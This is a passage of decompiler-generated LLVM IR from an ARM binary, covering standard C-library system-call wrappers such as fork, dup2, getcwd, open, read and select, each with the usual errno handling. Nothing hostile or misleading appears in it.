  %tmp = icmp ugt i32 %v1_11be0, 2
  br i1 %tmp, label %dec_label_pc_11c08, label %dec_label_pc_11c00

dec_label_pc_11c00:                               ; preds = %entry
  %v0_11c00 = call i32 @__GI_fcntl64()
  br label %dec_label_pc_11c34

dec_label_pc_11c08:                               ; preds = %entry
  %v2_11c10 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_11c10, i32* %r4.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_11c10, -4095
  br i1 %tmp8, label %dec_label_pc_11c34, label %dec_label_pc_11c20

dec_label_pc_11c20:                               ; preds = %dec_label_pc_11c08
  %v0_11c20 = call i32 @__errno_location()
  %v0_11c24 = load i32, i32* %r4.global-to-local, align 4
  %v1_11c24 = sub i32 0, %v0_11c24
  %v2_11c28 = inttoptr i32 %v0_11c20 to i32*
  store i32 %v1_11c24, i32* %v2_11c28, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11c34

dec_label_pc_11c34:                               ; preds = %dec_label_pc_11c20, %dec_label_pc_11c08, %dec_label_pc_11c00
  %storemerge = phi i32 [ %v0_11c00, %dec_label_pc_11c00 ], [ %v2_11c10, %dec_label_pc_11c08 ], [ -1, %dec_label_pc_11c20 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_11c10, { 1, 0, 2 }
}

define i32 @__GI_fcntl64() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v0_11c64 = load i32, i32* @r0, align 4
  store i32 %v0_11c64, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11c64, -4095
  br i1 %tmp, label %dec_label_pc_11c80, label %dec_label_pc_11c70

dec_label_pc_11c70:                               ; preds = %entry
  %v0_11c70 = call i32 @__errno_location()
  %v0_11c74 = load i32, i32* %r4.global-to-local, align 4
  %v1_11c74 = sub i32 0, %v0_11c74
  %v2_11c78 = inttoptr i32 %v0_11c70 to i32*
  store i32 %v1_11c74, i32* %v2_11c78, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11c80

dec_label_pc_11c80:                               ; preds = %entry, %dec_label_pc_11c70
  %v0_11c80 = phi i32 [ %v0_11c64, %entry ], [ -1, %dec_label_pc_11c70 ]
  ret i32 %v0_11c80

; uselistorder directives
  uselistorder i32 %v0_11c64, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11c80, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @__GI__exit(i32 %arg1) local_unnamed_addr #0 {
entry:
  store i32 %arg1, i32* @r5, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @chdir() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11cbc = load i32, i32* @r4, align 4
  store i32 %v3_11cbc, i32* %stack_var_-8, align 4
  %v0_11cc0 = call i32 @chdir()
  store i32 %v0_11cc0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11cc0, -4095
  br i1 %tmp, label %dec_label_pc_11ce0, label %dec_label_pc_11cd0

dec_label_pc_11cd0:                               ; preds = %entry
  %v0_11cd0 = call i32 @__errno_location()
  %v0_11cd4 = load i32, i32* %r4.global-to-local, align 4
  %v1_11cd4 = sub i32 0, %v0_11cd4
  %v2_11cd8 = inttoptr i32 %v0_11cd0 to i32*
  store i32 %v1_11cd4, i32* %v2_11cd8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11ce0

dec_label_pc_11ce0:                               ; preds = %entry, %dec_label_pc_11cd0
  %v0_11ce0 = phi i32 [ %v0_11cc0, %entry ], [ -1, %dec_label_pc_11cd0 ]
  %v2_11ce4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11ce4, i32* @r4, align 4
  ret i32 %v0_11ce0

; uselistorder directives
  uselistorder i32 %v0_11cc0, { 1, 0, 2 }
  uselistorder i32 ()* @chdir, { 1, 0 }
  uselistorder label %dec_label_pc_11ce0, { 1, 0 }
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11ce8 = load i32, i32* @r4, align 4
  store i32 %v3_11ce8, i32* %stack_var_-8, align 4
  %v1_11cec = call i32 @close(i32 %arg1)
  store i32 %v1_11cec, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v1_11cec, -4095
  br i1 %tmp, label %dec_label_pc_11d0c, label %dec_label_pc_11cfc

dec_label_pc_11cfc:                               ; preds = %entry
  %v0_11cfc = call i32 @__errno_location()
  %v0_11d00 = load i32, i32* %r4.global-to-local, align 4
  %v1_11d00 = sub i32 0, %v0_11d00
  %v2_11d04 = inttoptr i32 %v0_11cfc to i32*
  store i32 %v1_11d00, i32* %v2_11d04, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11d0c

dec_label_pc_11d0c:                               ; preds = %entry, %dec_label_pc_11cfc
  %v0_11d0c = phi i32 [ %v1_11cec, %entry ], [ -1, %dec_label_pc_11cfc ]
  %v2_11d10 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11d10, i32* @r4, align 4
  ret i32 %v0_11d0c

; uselistorder directives
  uselistorder i32 %v1_11cec, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11d0c, { 1, 0 }
}

define i32 @dup2() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11d14 = load i32, i32* @r4, align 4
  store i32 %v3_11d14, i32* %stack_var_-8, align 4
  %v0_11d18 = call i32 @dup2()
  store i32 %v0_11d18, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11d18, -4095
  br i1 %tmp, label %dec_label_pc_11d38, label %dec_label_pc_11d28

dec_label_pc_11d28:                               ; preds = %entry
  %v0_11d28 = call i32 @__errno_location()
  %v0_11d2c = load i32, i32* %r4.global-to-local, align 4
  %v1_11d2c = sub i32 0, %v0_11d2c
  %v2_11d30 = inttoptr i32 %v0_11d28 to i32*
  store i32 %v1_11d2c, i32* %v2_11d30, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11d38

dec_label_pc_11d38:                               ; preds = %entry, %dec_label_pc_11d28
  %v0_11d38 = phi i32 [ %v0_11d18, %entry ], [ -1, %dec_label_pc_11d28 ]
  %v2_11d3c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11d3c, i32* @r4, align 4
  ret i32 %v0_11d38

; uselistorder directives
  uselistorder i32 %v0_11d18, { 1, 0, 2 }
  uselistorder i32 ()* @dup2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11d38, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11d40 = load i32, i32* @r4, align 4
  store i32 %v3_11d40, i32* %stack_var_-8, align 4
  %v0_11d44 = call i32 @fork()
  store i32 %v0_11d44, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11d44, -4095
  br i1 %tmp, label %dec_label_pc_11d64, label %dec_label_pc_11d54

dec_label_pc_11d54:                               ; preds = %entry
  %v0_11d54 = call i32 @__errno_location()
  %v0_11d58 = load i32, i32* %r4.global-to-local, align 4
  %v1_11d58 = sub i32 0, %v0_11d58
  %v2_11d5c = inttoptr i32 %v0_11d54 to i32*
  store i32 %v1_11d58, i32* %v2_11d5c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11d64

dec_label_pc_11d64:                               ; preds = %entry, %dec_label_pc_11d54
  %v0_11d64 = phi i32 [ %v0_11d44, %entry ], [ -1, %dec_label_pc_11d54 ]
  %v2_11d68 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11d68, i32* @r4, align 4
  ret i32 %v0_11d64

; uselistorder directives
  uselistorder i32 %v0_11d44, { 1, 0, 2 }
  uselistorder i32 ()* @fork, { 1, 0 }
  uselistorder label %dec_label_pc_11d64, { 1, 0 }
}

define i32 @getcwd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_11d6c = load i32, i32* @r4, align 4
  store i32 %v3_11d6c, i32* %stack_var_-20, align 4
  %v6_11d6c = load i32, i32* @r5, align 4
  %v9_11d6c = load i32, i32* @r6, align 4
  %v12_11d6c = load i32, i32* @r7, align 4
  store i32 %arg2, i32* @r7, align 4
  %v2_11d70 = icmp eq i32 %arg2, 0
  store i32 %arg1, i32* @r5, align 4
  %v2_11d7c = icmp eq i32 %arg1, 0
  br i1 %v2_11d70, label %dec_label_pc_11d7c, label %dec_label_pc_11dac

dec_label_pc_11d7c:                               ; preds = %entry
  br i1 %v2_11d7c, label %dec_label_pc_11d98, label %dec_label_pc_11d84

dec_label_pc_11d84:                               ; preds = %dec_label_pc_11d7c
  %v0_11d84 = call i32 @__errno_location()
  %v0_11d88 = load i32, i32* @r7, align 4
  store i32 %v0_11d88, i32* @r5, align 4
  %v2_11d90 = inttoptr i32 %v0_11d84 to i32*
  store i32 22, i32* %v2_11d90, align 4
  br label %dec_label_pc_11e3c

dec_label_pc_11d98:                               ; preds = %dec_label_pc_11d7c
  %v0_11d98 = call i32 @__GI_getpagesize()
  %v5_11da0 = icmp slt i32 %v0_11d98, 4096
  br i1 %v5_11da0, label %bb15, label %bb

bb:                                               ; preds = %dec_label_pc_11d98
  store i32 %v0_11d98, i32* @r4, align 4
  br label %dec_label_pc_11dbc

bb15:                                             ; preds = %dec_label_pc_11d98
  store i32 4096, i32* @r4, align 4
  br label %dec_label_pc_11dbc

dec_label_pc_11dac:                               ; preds = %entry
  store i32 %arg2, i32* @r4, align 4
  br i1 %v2_11d7c, label %dec_label_pc_11dbc, label %bb16

bb16:                                             ; preds = %dec_label_pc_11dac
  store i32 %arg1, i32* @r6, align 4
  br label %dec_label_pc_11dcc

dec_label_pc_11dbc:                               ; preds = %dec_label_pc_11dac, %bb, %bb15
  %v0_11dbc = phi i32 [ %v0_11d98, %bb ], [ 4096, %bb15 ], [ %arg2, %dec_label_pc_11dac ]
  %v1_11dc0 = call i32 @malloc(i32 %v0_11dbc)
  store i32 %v1_11dc0, i32* @r6, align 4
  %v2_11dc4 = icmp eq i32 %v1_11dc0, 0
  br i1 %v2_11dc4, label %dec_label_pc_11e38, label %dec_label_pc_11dbc.dec_label_pc_11dcc_crit_edge

dec_label_pc_11dbc.dec_label_pc_11dcc_crit_edge:  ; preds = %dec_label_pc_11dbc
  %v0_11dcc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_11dcc

dec_label_pc_11dcc:                               ; preds = %bb16, %dec_label_pc_11dbc.dec_label_pc_11dcc_crit_edge
  %v0_11dd0 = phi i32 [ %v1_11dc0, %dec_label_pc_11dbc.dec_label_pc_11dcc_crit_edge ], [ %arg1, %bb16 ]
  %v0_11dcc = phi i32 [ %v0_11dcc.pre, %dec_label_pc_11dbc.dec_label_pc_11dcc_crit_edge ], [ %arg2, %bb16 ]
  %v2_11dd4 = call i32 @getcwd(i32 %v0_11dd0, i32 %v0_11dcc)
  store i32 %v2_11dd4, i32* @r4, align 4
  %tmp = icmp ult i32 %v2_11dd4, -4095
  br i1 %tmp, label %dec_label_pc_11df4, label %dec_label_pc_11de4

dec_label_pc_11de4:                               ; preds = %dec_label_pc_11dcc
  %v0_11de4 = call i32 @__errno_location()
  %v0_11de8 = load i32, i32* @r4, align 4
  %v1_11de8 = sub i32 0, %v0_11de8
  %v2_11dec = inttoptr i32 %v0_11de4 to i32*
  store i32 %v1_11de8, i32* %v2_11dec, align 4
  br label %dec_label_pc_11e24

dec_label_pc_11df4:                               ; preds = %dec_label_pc_11dcc
  %v1_11df4 = icmp slt i32 %v2_11dd4, 0
  br i1 %v1_11df4, label %dec_label_pc_11e24, label %dec_label_pc_11dfc

dec_label_pc_11dfc:                               ; preds = %dec_label_pc_11df4
  %v0_11dfc = load i32, i32* @r5, align 4
  %v2_11dfc = icmp eq i32 %v0_11dfc, 0
  br i1 %v2_11dfc, label %bb17, label %dec_label_pc_11e18.thread7

dec_label_pc_11e18.thread7:                       ; preds = %dec_label_pc_11dfc
  br label %dec_label_pc_11e3c

bb17:                                             ; preds = %dec_label_pc_11dfc
  %v1_11e00 = load i32, i32* @r7, align 4
  %v3_11e00 = icmp eq i32 %v1_11e00, 0
  br i1 %v3_11e00, label %dec_label_pc_11e18, label %dec_label_pc_11e18.thread

dec_label_pc_11e18.thread:                        ; preds = %bb17
  br label %bb18

dec_label_pc_11e18:                               ; preds = %bb17
  %v0_11e0c = load i32, i32* @r6, align 4
  %v2_11e10 = call i32 @realloc(i32 %v0_11e0c, i32 %v2_11dd4)
  store i32 %v2_11e10, i32* @r5, align 4
  %v2_11e18 = icmp eq i32 %v2_11e10, 0
  br i1 %v2_11e18, label %bb18, label %dec_label_pc_11e3c

bb18:                                             ; preds = %dec_label_pc_11e18.thread, %dec_label_pc_11e18
  %v1_11e1c = load i32, i32* @r6, align 4
  store i32 %v1_11e1c, i32* @r5, align 4
  br label %dec_label_pc_11e3c

dec_label_pc_11e24:                               ; preds = %dec_label_pc_11df4, %dec_label_pc_11de4
  %v0_11e24 = load i32, i32* @r5, align 4
  %v2_11e24 = icmp eq i32 %v0_11e24, 0
  br i1 %v2_11e24, label %dec_label_pc_11e2c, label %dec_label_pc_11e38

dec_label_pc_11e2c:                               ; preds = %dec_label_pc_11e24
  %v0_11e2c = load i32, i32* @r6, align 4
  store i32 %v0_11e2c, i32* @r0, align 4
  %v0_11e30 = call i32 @free()
  br label %dec_label_pc_11e3c

dec_label_pc_11e38:                               ; preds = %dec_label_pc_11e24, %dec_label_pc_11dbc
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_11e3c

dec_label_pc_11e3c:                               ; preds = %dec_label_pc_11e18.thread7, %bb18, %dec_label_pc_11e18, %dec_label_pc_11e2c, %dec_label_pc_11d84, %dec_label_pc_11e38
  %v0_11e3c = load i32, i32* @r5, align 4
  %v2_11e40 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_11e40, i32* @r4, align 4
  store i32 %v6_11d6c, i32* @r5, align 4
  store i32 %v9_11d6c, i32* @r6, align 4
  store i32 %v12_11d6c, i32* @r7, align 4
  ret i32 %v0_11e3c

; uselistorder directives
  uselistorder i32 %v2_11dd4, { 1, 3, 0, 2 }
  uselistorder i32 %v0_11d98, { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @getcwd, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_11e3c, { 5, 3, 1, 2, 0, 4 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_11dcc, { 1, 0 }
  uselistorder label %dec_label_pc_11dbc, { 0, 2, 1 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_11e48 = ptrtoint i32* %stack_var_-12 to i32
  %v2_11e54 = call i32 @getrlimit(i32 7, i32 %v2_11e48)
  %v1_11e58 = icmp slt i32 %v2_11e54, 0
  br i1 %v1_11e58, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v5_11e60 = load i32, i32* %stack_var_-12, align 4
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v5_11e68 = phi i32 [ 256, %entry ], [ %v5_11e60, %bb ]
  ret i32 %v5_11e68

; uselistorder directives
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v2_11e70 = load i32, i32* @global_var_33848.986, align 4
  %v2_11e74 = icmp eq i32 %v2_11e70, 0
  br i1 %v2_11e74, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_11e7c = phi i32 [ %v2_11e70, %entry ], [ 4096, %bb ]
  ret i32 %v1_11e7c

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11e84 = load i32, i32* @r4, align 4
  store i32 %v3_11e84, i32* %stack_var_-8, align 4
  %v0_11e88 = call i32 @getpid()
  store i32 %v0_11e88, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11e88, -4095
  br i1 %tmp, label %dec_label_pc_11ea8, label %dec_label_pc_11e98

dec_label_pc_11e98:                               ; preds = %entry
  %v0_11e98 = call i32 @__errno_location()
  %v0_11e9c = load i32, i32* %r4.global-to-local, align 4
  %v1_11e9c = sub i32 0, %v0_11e9c
  %v2_11ea0 = inttoptr i32 %v0_11e98 to i32*
  store i32 %v1_11e9c, i32* %v2_11ea0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11ea8

dec_label_pc_11ea8:                               ; preds = %entry, %dec_label_pc_11e98
  %v0_11ea8 = phi i32 [ %v0_11e88, %entry ], [ -1, %dec_label_pc_11e98 ]
  %v2_11eac = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11eac, i32* @r4, align 4
  ret i32 %v0_11ea8

; uselistorder directives
  uselistorder i32 %v0_11e88, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11ea8, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11eb0 = load i32, i32* @r4, align 4
  store i32 %v3_11eb0, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_11ed4, label %dec_label_pc_11ec4

dec_label_pc_11ec4:                               ; preds = %entry
  %v0_11ec4 = call i32 @__errno_location()
  %v0_11ec8 = load i32, i32* %r4.global-to-local, align 4
  %v1_11ec8 = sub i32 0, %v0_11ec8
  %v2_11ecc = inttoptr i32 %v0_11ec4 to i32*
  store i32 %v1_11ec8, i32* %v2_11ecc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_11ed8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11ed4

dec_label_pc_11ed4:                               ; preds = %entry, %dec_label_pc_11ec4
  %v2_11ed8 = phi i32 [ %v3_11eb0, %entry ], [ %v2_11ed8.pre, %dec_label_pc_11ec4 ]
  %v0_11ed4 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_11ec4 ]
  store i32 %v2_11ed8, i32* @r4, align 4
  ret i32 %v0_11ed4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11ed4, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v0_11ef8 = load i32, i32* @r0, align 4
  %v3_11ef8 = call i32 @ioctl(i32 %v0_11ef8, i32 %arg1, i32 %arg2)
  store i32 %v3_11ef8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v3_11ef8, -4095
  br i1 %tmp, label %dec_label_pc_11f18, label %dec_label_pc_11f08

dec_label_pc_11f08:                               ; preds = %entry
  %v0_11f08 = call i32 @__errno_location()
  %v0_11f0c = load i32, i32* %r4.global-to-local, align 4
  %v1_11f0c = sub i32 0, %v0_11f0c
  %v2_11f10 = inttoptr i32 %v0_11f08 to i32*
  store i32 %v1_11f0c, i32* %v2_11f10, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11f18

dec_label_pc_11f18:                               ; preds = %entry, %dec_label_pc_11f08
  %v0_11f18 = phi i32 [ %v3_11ef8, %entry ], [ -1, %dec_label_pc_11f08 ]
  ret i32 %v0_11f18

; uselistorder directives
  uselistorder i32 %v3_11ef8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11f18, { 1, 0 }
}

define i32 @kill() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11f2c = load i32, i32* @r4, align 4
  store i32 %v3_11f2c, i32* %stack_var_-8, align 4
  %v0_11f30 = call i32 @kill()
  store i32 %v0_11f30, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11f30, -4095
  br i1 %tmp, label %dec_label_pc_11f50, label %dec_label_pc_11f40

dec_label_pc_11f40:                               ; preds = %entry
  %v0_11f40 = call i32 @__errno_location()
  %v0_11f44 = load i32, i32* %r4.global-to-local, align 4
  %v1_11f44 = sub i32 0, %v0_11f44
  %v2_11f48 = inttoptr i32 %v0_11f40 to i32*
  store i32 %v1_11f44, i32* %v2_11f48, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11f50

dec_label_pc_11f50:                               ; preds = %entry, %dec_label_pc_11f40
  %v0_11f50 = phi i32 [ %v0_11f30, %entry ], [ -1, %dec_label_pc_11f40 ]
  %v2_11f54 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11f54, i32* @r4, align 4
  ret i32 %v0_11f50

; uselistorder directives
  uselistorder i32 %v0_11f30, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11f50, { 1, 0 }
}

define i32 @__libc_open(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v1_11f68 = and i32 %arg2, 64
  %v2_11f68 = icmp eq i32 %v1_11f68, 0
  br i1 %v2_11f68, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v6_11f58 = load i32, i32* @r2, align 4
  %phitmp = urem i32 %v6_11f58, 65536
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v0_11f78 = phi i32 [ 0, %entry ], [ %phitmp, %bb ]
  store i32 %v0_11f78, i32* @r2, align 4
  %v4_11f80 = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %arg2)
  %v7_11f84 = icmp eq i32 %v4_11f80, -4096
  store i1 %v7_11f84, i1* @cpsr_z, align 1
  store i32 %v4_11f80, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_11f80, -4095
  br i1 %tmp, label %dec_label_pc_11fa0, label %dec_label_pc_11f90

dec_label_pc_11f90:                               ; preds = %.thread1
  %v0_11f90 = call i32 @__errno_location()
  %v0_11f94 = load i32, i32* %r4.global-to-local, align 4
  %v1_11f94 = sub i32 0, %v0_11f94
  %v2_11f98 = inttoptr i32 %v0_11f90 to i32*
  store i32 %v1_11f94, i32* %v2_11f98, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11fa0

dec_label_pc_11fa0:                               ; preds = %.thread1, %dec_label_pc_11f90
  %v0_11fa0 = phi i32 [ %v4_11f80, %.thread1 ], [ -1, %dec_label_pc_11f90 ]
  ret i32 %v0_11fa0

; uselistorder directives
  uselistorder i32 %v4_11f80, { 2, 0, 3, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_11fa0, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r2, align 4
  %v0_11fbc = load i32, i32* @r0, align 4
  %v2_11fbc = inttoptr i32 %v0_11fbc to i8*
  %v3_11fbc = call i32 @__libc_open(i8* %v2_11fbc, i32 577)
  %v0_11fc0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11fc0, label %bb, label %bb2

bb:                                               ; preds = %entry
  %v6_11fc0 = and i32 %v3_11fbc, 36
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v7_11fc0 = phi i32 [ %v3_11fbc, %entry ], [ %v6_11fc0, %bb ]
  ret i32 %v7_11fc0

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__GI_pipe(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11fc4 = load i32, i32* @r4, align 4
  store i32 %v3_11fc4, i32* %stack_var_-8, align 4
  %v1_11fc8 = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_11fc8 = call i32 @pipe([2 x i32] %v1_11fc8)
  store i32 %v2_11fc8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_11fc8, -4095
  br i1 %tmp, label %dec_label_pc_11fe8, label %dec_label_pc_11fd8

dec_label_pc_11fd8:                               ; preds = %entry
  %v0_11fd8 = call i32 @__errno_location()
  %v0_11fdc = load i32, i32* %r4.global-to-local, align 4
  %v1_11fdc = sub i32 0, %v0_11fdc
  %v2_11fe0 = inttoptr i32 %v0_11fd8 to i32*
  store i32 %v1_11fdc, i32* %v2_11fe0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11fe8

dec_label_pc_11fe8:                               ; preds = %entry, %dec_label_pc_11fd8
  %v0_11fe8 = phi i32 [ %v2_11fc8, %entry ], [ -1, %dec_label_pc_11fd8 ]
  %v2_11fec = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11fec, i32* @r4, align 4
  ret i32 %v0_11fe8

; uselistorder directives
  uselistorder i32 %v2_11fc8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11fe8, { 1, 0 }
}

define i32 @prctl() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11ff0 = load i32, i32* @r4, align 4
  store i32 %v3_11ff0, i32* %stack_var_-8, align 4
  %v0_11ff8 = call i32 @prctl()
  store i32 %v0_11ff8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11ff8, -4095
  br i1 %tmp, label %dec_label_pc_12018, label %dec_label_pc_12008

dec_label_pc_12008:                               ; preds = %entry
  %v0_12008 = call i32 @__errno_location()
  %v0_1200c = load i32, i32* %r4.global-to-local, align 4
  %v1_1200c = sub i32 0, %v0_1200c
  %v2_12010 = inttoptr i32 %v0_12008 to i32*
  store i32 %v1_1200c, i32* %v2_12010, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12018

dec_label_pc_12018:                               ; preds = %entry, %dec_label_pc_12008
  %v0_12018 = phi i32 [ %v0_11ff8, %entry ], [ -1, %dec_label_pc_12008 ]
  %v2_1201c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1201c, i32* @r4, align 4
  ret i32 %v0_12018

; uselistorder directives
  uselistorder i32 %v0_11ff8, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1 }
  uselistorder i32 ()* @prctl, { 1, 0 }
  uselistorder label %dec_label_pc_12018, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12020 = load i32, i32* @r4, align 4
  store i32 %v3_12020, i32* %stack_var_-8, align 4
  %v1_12024 = load i32, i32* @r1, align 4
  %v2_12024 = inttoptr i32 %v1_12024 to i32*
  %v3_12024 = load i32, i32* @r2, align 4
  %v4_12024 = call i32 @read(i32 %arg1, i32* %v2_12024, i32 %v3_12024)
  store i32 %v4_12024, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_12024, -4095
  br i1 %tmp, label %dec_label_pc_12044, label %dec_label_pc_12034

dec_label_pc_12034:                               ; preds = %entry
  %v0_12034 = call i32 @__errno_location()
  %v0_12038 = load i32, i32* %r4.global-to-local, align 4
  %v1_12038 = sub i32 0, %v0_12038
  %v2_1203c = inttoptr i32 %v0_12034 to i32*
  store i32 %v1_12038, i32* %v2_1203c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12044

dec_label_pc_12044:                               ; preds = %entry, %dec_label_pc_12034
  %v0_12044 = phi i32 [ %v4_12024, %entry ], [ -1, %dec_label_pc_12034 ]
  %v2_12048 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12048, i32* @r4, align 4
  ret i32 %v0_12044

; uselistorder directives
  uselistorder i32 %v4_12024, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12044, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1204c = load i32, i32* @r4, align 4
  store i32 %v3_1204c, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_12074, label %dec_label_pc_12064

dec_label_pc_12064:                               ; preds = %entry
  %v0_12064 = call i32 @__errno_location()
  %v0_12068 = load i32, i32* %r4.global-to-local, align 4
  %v1_12068 = sub i32 0, %v0_12068
  %v2_1206c = inttoptr i32 %v0_12064 to i32*
  store i32 %v1_12068, i32* %v2_1206c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_12078.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12074

dec_label_pc_12074:                               ; preds = %entry, %dec_label_pc_12064
  %v2_12078 = phi i32 [ %v3_1204c, %entry ], [ %v2_12078.pre, %dec_label_pc_12064 ]
  %v0_12074 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_12064 ]
  store i32 %v2_12078, i32* @r4, align 4
  ret i32 %v0_12074

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12074, { 1, 0 }
}

